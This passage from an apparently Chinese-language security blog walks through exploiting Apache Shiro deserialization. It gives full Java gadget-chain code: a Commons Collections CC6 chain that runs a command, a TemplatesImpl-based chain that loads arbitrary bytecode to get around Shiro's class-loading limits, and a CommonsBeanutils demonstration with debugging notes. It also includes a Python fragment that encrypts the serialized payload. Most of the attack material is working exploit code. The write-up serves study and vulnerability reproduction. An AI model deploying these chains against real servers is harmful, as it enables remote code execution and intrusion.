base64.b64encode(iv  + encryptor.encrypt(pad(data)))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    data = get_file_data(<span class="string">&quot;ser.bin&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(shiro_enc(data)) </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javafx.beans.binding.ObjectExpression;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object ,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry= <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span>c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);</span><br><span class="line">        serialize(map2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        写对象，序列化</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        读对象，反序列化</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现报错，打不了</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204030941602.png" alt="image-20220403094142471"></p>
+<p>shiro内置的，导致CC链打不了，shiro自己重写了。</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204030926992.png" alt="image-20220403092651898"></p>
+<p>tomcat不能加载数组类，调了tomcat的findclass</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204030918434.png" alt="image-20220402235203760"></p>
+<p>所以需要改一下代码，拼接下，目的是不调用数组类</p>
+<p>我们直接用<code>TemplatesImpl</code>然后去重新写一条链子</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroCC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//cc3</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodeField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\17140\\Desktop\\暑假实习\\java代码审计\\Cc1_test\\target\\classes\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span> [][] codes= &#123;code&#125;;</span><br><span class="line">        bytecodeField.set(templates,codes);</span><br><span class="line">        <span class="comment">//cc2</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//cc6</span></span><br><span class="line">        HashMap&lt;Object ,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry= <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,templates);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazyMap.remove(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span>c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,invokerTransformer);</span><br><span class="line">        serialize(map2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        写对象，序列化</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        读对象，反序列化</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>具体调用的链子可以看代码，生成ser.bin</p>
+<p>再把它加密，可以看到命令已经执行</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031057471.png" alt="image-20220403105708324"></p>
+<h1 id="CommonsBeanutils"><a href="#CommonsBeanutils" class="headerlink" title="CommonsBeanutils"></a><strong>CommonsBeanutils</strong></h1><h2 id="环境-2"><a href="#环境-2" class="headerlink" title="环境"></a>环境</h2><h2 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h2><p>1.8.3</p>
+<p>​    CommonsBeanutils中提供了一个静态方法 PropertyUtils.getProperty ，让使用者可以直接调用任意 JavaBean 的getter方法，JavaBean 即指符合特定规范的 Java 类</p>
+<ul>
+<li><p>若干<code>private</code>实例字段</p>
+</li>
+<li><p>通过<code>public</code>方法来读写实例字段</p>
+</li>
+</ul>
+<p>PropertyUtils.getProperty() 传入两个参数，第一个参数为 JavaBean 实例，第二个是 JavaBean 的属性</p>
+<p>下面简单的展示一个例子，首先写一个符合规范的 Calc 类，然后编写一个 Demo 类使其自动调用 Calc 的 getter 方法，如下会自动调用 name 属性的 getter 函数，最终调用 getName()</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">PropertyUtils</span>.</span></span>get<span class="constructor">Property(<span class="params">new</span> Calc()</span>,<span class="string">&quot;name&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Calc:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;Hello,World&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getter...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setter...&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Demo:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        PropertyUtils.getProperty(<span class="keyword">new</span> <span class="title class_">Calc</span>(),<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>效果如下：</p>
+<p>自动调用了 Calc 的 getter 函数</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132238881.png" alt="img"></p>
+<p>shiro里面只有CC链2能打，第二条链子需要CC4版本，我们这边可以利用CB链来打。</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031110724.png" alt="image-20220403111035611"></p>
+<p>关于javabean的一些知识</p>
+<p><a target="_blank" rel="noopener" href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680</a></p>
+<p>Person.java</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(<span class="type">String</span> name, <span class="type">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">String</span> <span class="title">getName</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> name; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">void</span> <span class="title">setName</span><span class="params">(<span class="type">String</span> name)</span> </span>&#123; <span class="keyword">this</span>.name = name; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> age; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">void</span> <span class="title">setAge</span><span class="params">(<span class="type">int</span> age)</span> </span>&#123; <span class="keyword">this</span>.age = age; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>BeanTest.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BeanTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;aaa&quot;</span>,<span class="number">18</span>);</span><br><span class="line">        System.out.println(PropertyUtils.getProperty(person,<span class="string">&quot;age&quot;</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>CB给了一个动态调用对象的值，原理同上</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031459258.png" alt="image-20220403145935103"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031459560.png" alt="image-20220403145956451"></p>
+<p>我们调试下看看是怎么实现的。</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031502198.png" alt="image-20220403150151341"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031504359.png" alt="image-20220403150408231"></p>
+<p>调了<code>PropertyUtilsBean.getInstance().getProperty</code></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031504616.png" alt="image-20220403150437488"></p>
+<p>到了<code>getNestedProperty</code></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031505008.png" alt="image-20220403150541898"></p>
+<p>一路跟下去</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031507316.png" alt="image-20220403150758208"></p>
+<p>到<code>getSimpleProperty</code></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031508904.png" alt="image-20220403150838780"></p>
+<p>我们直接到</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031509448.png" alt="image-20220403150942332"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031511160.png" alt="image-20220403151156032"></p>
+<p>做了一个反射调用</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031512807.png" alt="image-20220403151224689"></p>
+<p>所以是做了一个反射调用来进行修改值</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031513004.png" alt="image-20220403151312897"></p>
+<p>JAVAbean的属性值要小写，后面会自动转为大写</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BeanTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;aaa&quot;</span>,<span class="number">18</span>);</span><br><span class="line"><span class="comment">//       System.out.println(PropertyUtils.getProperty(person,&quot;name&quot;));</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodeField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\17140\\Desktop\\暑假实习\\java代码审计\\Cc1_test\\target\\classes\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span> codes[][]= &#123;code&#125;;</span><br><span class="line">        bytecodeField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="comment">//templates.newTransformer();</span></span><br><span class="line">        PropertyUtils.getProperty(templates,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031516753.png" alt="image-20220403151640505"></p>
+<p>可以看到代码执行了，所以思路就是找<code>getProperty</code></p>
+<p>我们看到<code>compare</code>的<code>property</code>可控，且调用了<code>getProperty</code></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031519051.png" alt="image-20220403151930918"></p>
+<p>然后想到优先队列的<code>compare</code>，所以可以直接到<code>BeanComparator.compare</code></p>
+<p>基本上就是一个这样的思路</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031523456.png" alt="image-20220403152317305"></p>
+<p>这边直接用CC2的思路去改一下就可以了</p>
